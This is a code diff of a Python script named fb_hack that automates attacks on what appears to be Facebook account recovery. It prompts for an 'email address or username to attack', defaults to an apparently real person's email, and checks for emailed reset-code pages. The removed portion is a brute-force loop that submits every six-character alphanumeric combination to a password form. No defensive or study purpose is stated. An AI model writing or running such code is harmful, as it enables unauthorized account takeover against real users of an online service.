@@ -76,6 +76,12 @@ def fb_hack(email, codex):
   check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+  response1 = browser.response()
+  soup = BeautifulSoup(response1, 'html.parser')
+  with open("output1.html", "w") as file:
+    file.write(str(soup))
+  with open("output1.txt", "w") as file:
+    file.write(str(soup))
   if check1 != test:
     attempt = int(codex)
     print(check1)
@@ -163,45 +169,7 @@ def fb_hack(email, codex):
   
   
   
-  counter = 0
-  response1 = browser.response()
-  soup = BeautifulSoup(response1, 'html.parser')
-  check1 = soup.find(string="Try another way")
-  check2 = soup.find(string="Try another way")
-  browser.select_form(nr=0)
-  for combination in  itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
-    x = (''.join(map(str, combination)))
-    try:
-      browser.form['pass'] = x
-      browser.submit()
-    except:
-      print("error")
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      with open("output1.html", "w") as file:
-        file.write(str(soup))
-      with open("output1.txt", "w") as file:
-        file.write(str(soup))
-      sys.exit()
-    test1 = (x, " Failed")
-    test2 = (x, " Succeded")
-    counter += 1
-    yo = h.join(test1)
-    yo2 = h.join(test2)
-    response1 = browser.response()
-    soup = BeautifulSoup(response1, 'html.parser')
-    check1 = soup.find(string="Try another way")
-    print(yo)
-    sleepy(30)
-    """except:
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      with open("output1.html", "w") as file:
-        file.write(str(soup))
-      with open("output1.txt", "w") as file:
-        file.write(str(soup))
-      print(counter)"""
-
+  
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 1)
